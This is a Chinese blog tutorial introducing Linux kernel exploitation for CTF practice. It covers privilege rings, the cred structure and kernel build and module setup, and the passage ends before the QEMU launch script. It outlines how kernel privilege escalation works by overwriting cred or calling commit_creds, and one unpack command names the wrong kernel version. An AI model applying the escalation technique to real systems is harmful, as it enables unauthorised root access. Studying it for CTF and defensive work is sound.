                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/ring_model.png"
                      class=""
                >
<p>cpu权限等级主要分为0-3四级，基本上常用的只有Ring0和Ring3，对应操作系统内核与用户进程，即
CPU 在执行用户进程代码时处在 ring3 下。</p>
<h5 id="状态切换">状态切换</h5>
<ul>
<li>中断与异常</li>
<li>特权级相关指令（iret，sysenter...）</li>
</ul>
<p>现代操作系统的开发者包装出了系统调用（syscall），作为由”用户态
“切换到”
内核态“的入口，从而执行内核代码来完成用户进程所需的一些功能。当用户进程想要请求更高权限的服务时，便需要通过由系统提供的应用接口，使用系统调用以陷入内核态，再由操作系统完成请求。</p>
<p>当发生
<code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>
等事件时，会发生用户态到内核态的切换，具体的过程为：</p>
<ol type="1">
<li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS
寄存器值和一个特定位置的值进行交换，目的是保存 GS
值，同时将该位置的值作为内核执行时的 GS 值使用。</li>
<li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU
独占区域里记录的内核栈顶放入 rsp/esp。</li>
<li>通过 push 保存各寄存器值</li>
<li>通过汇编指令判断是否为 <code>x32_abi</code>。</li>
<li>通过系统调用号，跳到全局变量 <code>sys_call_table</code>
相应位置继续执行系统调用。</li>
</ol>
<p>退出时，流程如下：</p>
<ol type="1">
<li>通过 <code>swapgs</code> 恢复 GS 值。</li>
<li>通过 <code>sysretq</code> 或者 <code>iretq</code>
恢复到用户控件继续执行。如果使用 <code>iretq</code>
还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）。</li>
</ol>
<h5 id="虚拟内存分布">虚拟内存分布</h5>
<p>分为供用户使用的用户空间和供内核使用的内核空间。</p>
<p>32位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_32.png"
                      class=""
                >
<p>64位内存分布：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/mm_layout_64.png"
                      class=""
                >
<h5 id="进程权限管理">进程权限管理</h5>
<p><strong>进程描述符</strong>：源码在<code>include/linux/sched.h</code>中，linux-5.15.153该版本部分源码如下，由于task_struct结构体定义极长，这里继续引用ctfwiki上的图片。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/task_struct.png"
                      class=""
                >
<p><strong>重要字段结构化表格</strong></p>
<table>
<colgroup>
<col style="width: 26%" />
<col style="width: 37%" />
<col style="width: 35%" />
</colgroup>
<thead>
<tr>
<th>类别</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>调度相关</strong></td>
<td><code>state</code>, <code>sched_class</code></td>
<td>调度信息</td>
</tr>
<tr>
<td></td>
<td><code>prio</code>, <code>static_prio</code></td>
<td>优先级</td>
</tr>
<tr>
<td></td>
<td><code>se</code>, <code>rt_priority</code></td>
<td>调度器实体</td>
</tr>
<tr>
<td><strong>内存管理</strong></td>
<td><code>mm</code>, <code>active_mm</code></td>
<td>内存描述符</td>
</tr>
<tr>
<td></td>
<td><code>stack</code>, <code>thread_info</code></td>
<td>内核栈与线程信息</td>
</tr>
<tr>
<td><strong>标识与控制</strong></td>
<td><code>pid</code>, <code>tgid</code></td>
<td>进程与线程组 ID</td>
</tr>
<tr>
<td></td>
<td><code>real_parent</code>, <code>children</code></td>
<td>父子关系管理</td>
</tr>
<tr>
<td><strong>资源管理</strong></td>
<td><code>files</code>, <code>fs</code>, <code>signal</code></td>
<td>文件、文件系统与信号资源</td>
</tr>
<tr>
<td></td>
<td><code>cred</code>, <code>limits</code></td>
<td>权限与资源限制</td>
</tr>
<tr>
<td><strong>统计与架构相关</strong></td>
<td><code>utime</code>, <code>stime</code></td>
<td>CPU 时间</td>
</tr>
<tr>
<td></td>
<td><code>cpu_context</code>, <code>thread</code></td>
<td>上下文信息</td>
</tr>
<tr>
<td><strong>安全与调试</strong></td>
<td><code>ptrace</code>, <code>seccomp</code></td>
<td>调试与安全机制</td>
</tr>
</tbody>
</table>
<p><strong>进程权限凭证</strong>（credential）</p>
<p>结构体 <code>cred</code>
用以管理一个进程的权限，该结构体定义于内核源码
<code>include/linux/cred.h</code> 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<p>我们主要关注各种id，这些字段用于定义任务的身份，并与权限检查密切相关。</p>
<ul>
<li><strong><code>kuid_t uid</code> 和 <code>kgid_t gid</code></strong>
<ul>
<li>真实用户 ID (<code>uid</code>) 和真实组 ID (<code>gid</code>)。</li>
<li>定义进程创建时的原始身份，通常由父进程继承。</li>
</ul></li>
<li><strong><code>kuid_t suid</code> 和
<code>kgid_t sgid</code></strong>
<ul>
<li>保存的用户 ID 和保存的组 ID。</li>
<li>用于暂时切换身份后恢复原始身份，常用于 SUID/SGID 程序。</li>
</ul></li>
<li><strong><code>kuid_t euid</code> 和
<code>kgid_t egid</code></strong>
<ul>
<li>有效用户 ID 和有效组 ID。</li>
<li>实际权限检查使用的身份，与真实身份不同的场景通常出现在提权操作中。</li>
</ul></li>
<li><strong><code>kuid_t fsuid</code> 和
<code>kgid_t fsgid</code></strong>
<ul>
<li>文件系统操作使用的用户 ID 和组 ID。</li>
<li>通常用于文件访问权限的检查。</li>
</ul></li>
</ul>
<p>一个进程的权限是由位于内核空间的 <code>cred</code>
结构体进行管理的，那么我们不难想到：只要改变一个进程的 <code>cred</code>
结构体，就能改变其执行权限。</p>
<p>在内核空间有如下两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的
cred 结构体，并返回一个新的 cred 结构体，需要注意的是 daemon
参数应为有效的进程描述符地址。如果传递的 <code>daemon</code> 参数为
<code>NULL</code>，则创建一个默认的 <code>cred</code>，通常用于与
<code>init</code> 进程（PID
1）关联的场景，较新版内核会直接返回错误。</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的
cred 结构体应用到进程。</li>
</ul>
<p>一般可以用<code>prepare_kernel_cred</code>先获取一个合法的cred结构体，然后更改里面的权限位后，再<code>commit_creds</code>应用到进程进行提权。但实际上在较新版的内核中，一般是直接改cred结构体，或是改task_struct的cred指针，抑或是调用<code>commit_creds(&amp;init_cred)</code>，来将具有root权限的init进程的cred结构体拷贝到我们当前进程。</p>
<h5 id="可装载内核模块"><strong>可装载内核模块</strong></h5>
<p><strong>LKMs</strong> 全称 <strong>Loadable Kernel
Modules</strong>，即<strong>可加载内核模块</strong>。它是一种可以在运行中的内核中动态加载或卸载的模块化代码。LKMs
为操作系统内核提供了灵活性，使其能够根据需要添加或移除功能，而无需重新编译或重启内核。</p>
<p>常见的 LKMs 包括：</p>
<ul>
<li>驱动程序（Device drivers）
<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>...</li>
</ul></li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>一般ctf题中，漏洞都是存在在<strong>.ko</strong>文件中，也就是<strong>LKM</strong>中。</p>
<p><strong>相关指令</strong></p>
<ul>
<li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
<li><strong>rmmod</strong>: 从内核中卸载指定模块</li>
<li><strong>lsmod</strong>: 列出已经加载的模块</li>
<li><strong>modprobe</strong>: 添加或删除模块，modprobe
在加载模块时会查找依赖关系</li>
</ul>
<h5 id="内核交互">内核交互</h5>
<p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如
IO
操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如
scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和
write））。</p>
<blockquote>
<p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和
<em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64
位和 32 位的系统调用号。</p>
</blockquote>
<p><code>ioctl</code> 是 Linux 和类 Unix
操作系统中用于设备控制的系统调用（system call）。它全称是
<strong>Input/Output
Control</strong>，主要用于对设备执行特殊操作或者控制设备的行为，这些操作通常无法通过标准的读（<code>read</code>）、写（<code>write</code>）系统调用完成。</p>
<p><strong>基本用法</strong></p>
<p>典型的 <code>ioctl</code> 原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>fd</code></strong>:
文件描述符，表示目标设备或文件。</li>
<li><strong><code>request</code></strong>:
请求码，用于指定具体的控制操作。</li>
<li><strong><code>...</code></strong>:
可选参数，通常是指向内存中数据的指针，具体取决于请求的操作。</li>
</ul>
<p><strong>常见用途</strong></p>
<ol type="1">
<li><strong>设备配置</strong>：设置设备参数（例如网络设备的 IP
地址、串口波特率）。</li>
<li><strong>信息查询</strong>：获取设备的状态、硬件信息等。</li>
<li><strong>非标准 I/O 操作</strong>：执行驱动中特殊的读写行为。</li>
<li><strong>硬件控制</strong>：控制底层硬件设备，例如磁盘分区管理。</li>
</ol>
<p><strong>示例代码</strong></p>
<p>一个简单的例子是设置终端属性：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">term</span>;</span></span><br><span class="line">    <span class="type">int</span> fd = <span class="number">0</span>; <span class="comment">// 通常 0 表示标准输入（终端）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, TCGETS, &amp;term) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;终端配置已成功获取\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>TCGETS</code></strong>: 获取终端的当前配置。</li>
<li><strong><code>struct termios</code></strong>:
存储终端配置的结构体。</li>
</ul>
<p><strong>请求码的构造</strong></p>
<p><code>ioctl</code> 请求码通常用四部分组成：</p>
<ul>
<li><strong>类型</strong>：表示设备类型，例如磁盘、终端。</li>
<li><strong>编号</strong>：特定命令的编号。</li>
<li><strong>方向</strong>：表示是读、写还是两者皆有。</li>
<li><strong>大小</strong>：与之交互的数据大小。</li>
</ul>
<p>宏 <strong><code>_IO</code>、<code>_IOR</code>、<code>_IOW</code> 和
<code>_IOWR</code></strong> 常被用于生成请求码。</p>
<ul>
<li><code>_IO</code>：无数据传输。</li>
<li><code>_IOR</code>：数据从内核传输到用户空间（读）。</li>
<li><code>_IOW</code>：数据从用户空间传输到内核（写）。</li>
<li><code>_IOWR</code>：双向传输（读写）。</li>
</ul>
<p><strong>注意事项</strong></p>
<ol type="1">
<li><strong>设备驱动依赖</strong>：<code>ioctl</code>
的功能完全由设备驱动程序实现，不同设备可能有不同的控制请求。</li>
<li><strong>安全性问题</strong>：由于 <code>ioctl</code>
可以直接操作设备，对参数的检查不足可能会带来漏洞，尤其是在权限提升攻击中。</li>
</ol>
<h4 id="环境搭建">环境搭建</h4>
<h5 id="下载内核">下载内核</h5>
<p><a class="link" 
 href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >清华源镜像站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下列步骤如果确信来源可靠的话，可以略过中间签名验证的三步。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.xz		<span class="comment">#可以选择自己想要的对应版本</span></span><br><span class="line">unxz linux-5.4.98.tar.xz	<span class="comment">#解压</span></span><br><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.sign	<span class="comment">#下载签名</span></span><br><span class="line">gpg --locate-keys gregkh@kernel.org		<span class="comment">#导入内核版本发布者的公钥。</span></span><br><span class="line">gpg --verify linux-5.15.153.tar.sign		<span class="comment">#验证签名</span></span><br><span class="line">tar -xf linux-5.15.153.tar		<span class="comment">#解压得到源码</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250112233721560.png"
                      class=""
                >
<p>然后配置内核的编译选项，可以用menuconfig来可视化配置。如果想要非交互式，直接调整
<code>.config</code> 文件或使用以下命令生成默认配置：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#默认配置</span></span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可视化自定义配置</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install libncurses-dev</span><br><span class="line"><span class="built_in">sudo</span> apt install flex</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113003141550.png"
                      class=""
                >
<p>这里我们主要关注调试方面的选项，依次进入到 Kernel hacking -&gt;
Compile-time checks and compiler
options，然后勾选如下选项<code>Compile the kernel with debug info</code>，以便于调试。</p>
<p>如果要使用 kgdb 调试内核，则需要选中
<code>KGDB: kernel debugger</code>，并选中 KGDB
下的所有选项。这里我试了下，linux-5.4.98这个版本有KGDB选项，而linux-5.15.153这个版本就没这个选项了，据说是默认开启。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004218124.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004304194.png"
                      class=""
                >
<h5 id="编译内核">编译内核</h5>
<p>编译内核前需要准备一些工具。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install build-essential libncurses-dev bison flex libssl-dev libelf-dev bc</span><br></pre></td></tr></table></figure></div>
<p>编译内核镜像，可以根据机器的核数来选择具体使用多少核来编译内核。这里我们将标准错误重定向到日志中看看。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nproc</span>		<span class="comment">#查看自己主机有多少核</span></span><br><span class="line">make -j$(<span class="built_in">nproc</span>) bzImage 2&gt; build_error.log		<span class="comment">#-jn就是指定用n核进行并行编译，直接指定为nproc全速运行进行编译</span></span><br></pre></td></tr></table></figure></div>
<p>编译时我遇到了以下错误：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">make[<span class="number">2</span>]: *** No rule to make target <span class="string">&#x27;net/netfilter/xt_TCPMSS.o&#x27;</span>, needed by <span class="string">&#x27;net/netfilter/built-in.a&#x27;</span>.  Stop.</span><br><span class="line">make[<span class="number">2</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make[<span class="number">1</span>]: *** [scripts/Makefile.build:<span class="number">552</span>: net/netfilter] Error <span class="number">2</span></span><br><span class="line">make[<span class="number">1</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make: *** [Makefile:<span class="number">1907</span>: net] Error <span class="number">2</span></span><br><span class="line">make: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br></pre></td></tr></table></figure></div>
<p>根据https://bbs.t-firefly.com/forum.php?mod=viewthread&amp;tid=1826这篇求助帖，发现问题大概是我们的文件系统大小写敏感，而<code>net/netfilter/</code>目录下只有<code>xt_tcpmss.c</code>这个文件。这里我们把其改名为<code>xt_TCPMSS.c</code>试试。然后最后出现如下提示，则编译成功。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113223946647.png"
                      class=""
                >
<h5 id="编译内核驱动">编译内核驱动</h5>
<h6 id="编写代码">编写代码</h6>
<p>这里我们以自己编译一个输出Hello World的内核驱动模块为例。</p>
<p>因为我所用的环境是vscode，而windows上的环境没有几个内核的头文件，所以我们要配置wsl远程开发。</p>
<p>安装 WSL 后：</p>
<ol type="1">
<li>在 VSCode 中安装 <a class="link" 
 href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-wsl" >Remote
- WSL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 插件。</li>
<li>点击 VSCode 左下角绿色的“打开远程窗口”图标，选择 “WSL: New
Window”，进入到 WSL 环境的文件系统。</li>
<li>确保在 WSL 中设置好文件路径共享，通过 <code>/mnt/c</code> 可直接访问
Windows 文件。</li>
</ol>
<p>在 WSL 中，可以直接开发和测试内核模块。具体代码实现如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//myko.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">//包含与内核相关的基本功能和工具，比如 printk 函数，用于向内核日志打印消息。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">//定义了 module_init 和 module_exit 宏，这些用于指定模块的入口和退出函数。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">//包含定义 Linux 内核模块所需的基础结构，例如 MODULE_LICENSE 宏。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明模块的许可证。内核需要知道你的模块是开源的还是闭源的。这里说明可以用 BSD 或 GPL 任一许可证。</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);	</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Hello, world!\n&quot;</span>);		<span class="comment">//类似于用户态的 printf，但它打印的信息会进入内核日志而不是终端。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Goodbye, cruel world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_init);		<span class="comment">//注册模块的初始化函数，告诉内核加载模块时应调用 my_init。</span></span><br><span class="line">module_exit(my_exit);		<span class="comment">//注册模块的清理函数，告诉内核卸载模块时应调用 my_exit。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h6 id="加载模块">加载模块</h6>
<p>先创建Makefile以便编译我们写好的内核驱动模块。</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">moduels_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>
<p><code>obj-m</code>:</p>
<p>指定需要编译的模块目标文件，这里是 <code>myko.ko</code>，源文件为
<code>myko.c</code>。</p>
<p><code>KERNELDR</code>:</p>
<p>定义内核源码路径，需要提供一个完整内核源码树。此目录必须配置了编译环境和内核头文件。</p>
<p><code>PWD</code>:</p>
<p>当前模块源代码的路径（<code>pwd</code>
命令的输出），在编译内核模块时会作为参数传递给内核构建系统。</p>
<p><code>modules</code>:</p>
<p>调用内核的构建系统，执行模块编译。</p>
<ul>
<li><code>-C $(KERNELDR)</code>: 切换到内核源码目录并使用它的
Makefile。</li>
<li><code>M=$(PWD)</code>:
指定模块代码所在的目录，内核会到这里查找模块代码并编译。</li>
</ul>
<p><code>modules_install</code>:
安装编译完成的模块（<code>myko.ko</code>）到系统指定的模块目录（通常是
<code>/lib/modules/$(uname -r)/</code>）。</p>
<p><code>clean</code>:
清除临时文件、编译生成的中间文件（<code>.o</code>、<code>.ko</code>、<code>.mod.c</code>
等）。</p>
<p>然后在终端make即可获取到myko.ko。可能会遇到以下错误：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230522662.png"
                      class=""
                >
<p>可以先在我们编译好的kernel目录下执行<code>make modules_prepare</code>重新加载符号表。然后就只会报warning而不会直接Error退出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230655614.png"
                      class=""
                >
<p>这里还是缺少符号文件。我们先忽略。</p>
<p>然后我们想要通过已经编译好的内核，起一个虚拟环境，以测试自己写好的模块。首先我们安装BusyBox以快速新建一个根文件系统。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install busybox</span><br></pre></td></tr></table></figure></div>
<p>然后按以下方式新建根文件系统，用的是busybox。将一些常用指令创建链接到busybox，busybox会根据指令类型自动执行对应指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件结构</span></span><br><span class="line"><span class="built_in">mkdir</span> -p bin dev etc lib proc sys tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 busybox</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> busybox) ./bin</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"><span class="built_in">ln</span> -s busybox sh</span><br><span class="line"><span class="built_in">ln</span> -s busybox init</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建简单的 init 脚本</span></span><br><span class="line"><span class="built_in">cat</span> &gt; init &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#!/bin/sh</span></span><br><span class="line"><span class="string">mount -t proc none /proc</span></span><br><span class="line"><span class="string">mount -t sysfs none /sys</span></span><br><span class="line"><span class="string">mount -t devtmpfs none /dev</span></span><br><span class="line"><span class="string">exec /bin/sh</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">chmod</span> +x init</span><br><span class="line"></span><br><span class="line">find . | cpio -o --format=newc | gzip &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure></div>
<p>执行完以上命令后，我们就得到了<code>initramfs.cpio.gz</code>这样一个文件系统，然后我们可以用qemu虚拟机起虚拟环境。先写一个sh脚本。其中用到了qemu虚拟机，所以我们要先进行安装。</p>
